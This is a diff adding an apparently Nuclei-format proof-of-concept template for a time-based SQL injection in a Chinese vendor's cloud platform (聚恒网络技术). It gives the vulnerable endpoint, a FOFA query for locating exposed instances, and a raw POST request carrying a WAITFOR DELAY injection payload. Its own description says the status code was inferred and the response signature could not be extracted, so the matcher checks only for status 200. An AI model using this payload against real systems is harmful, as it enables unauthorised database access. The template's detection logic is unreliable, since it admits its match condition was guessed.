@@ -1,0 +1,27 @@
+id: poc-plpkgy2wax4mgwtt
+info:
+  name: 聚恒网络技术有限公司云平台存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/plpkgy2wax4mgwtt
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: plpkgy2wax4mgwtt
+    fofa: body="/sysplat/dataget/data.ashx?type=sendvalidatecode"
+http:
+- raw:
+  - 'POST /sysplat/dataget/data.ashx?type=sendvalidatecode HTTP/1.1
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+    usercode=admin''+WAITFOR+DELAY ''0:0:5''--&mobile='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
